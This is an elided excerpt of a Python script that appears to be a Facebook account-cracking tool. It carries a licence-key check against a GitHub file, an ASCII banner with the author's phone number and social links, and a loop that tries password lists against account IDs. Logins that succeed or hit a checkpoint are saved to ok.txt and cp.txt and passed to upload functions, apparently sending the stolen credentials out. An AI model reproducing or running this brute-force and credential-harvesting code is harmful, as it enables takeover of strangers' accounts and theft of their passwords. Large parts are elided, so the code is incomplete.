...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰𝐓𝐎𝐌 ___④⓶⓪/ :* :/ 3:))
	subprocess.check_output(["am", "start", "https://m.me/MYMENSINGH.ER.CEO.SHAMIM.MAHMUD.2023"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/abusaidshamim/shamim/blob/main/shamim.txt').text
			if basesplit in plr:
				key = basesplit
...
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝     ╚═╝                                                
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : 𝐓𝐎𝐌 ___④⓶⓪/ :* :/ 3:)
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : 🔴༒CuTe🦋ProFilE🦋PicTure BoY GriL🦋ID GIFT🦋CoMMunity༒🔴
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : SHAMIM
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +8801725601594
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Shamim): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SHAMIM_OLD] : %s/%s -> \033[0;92m [ SHAMIM-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SHAMIM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SHAMIM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SHAMIM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
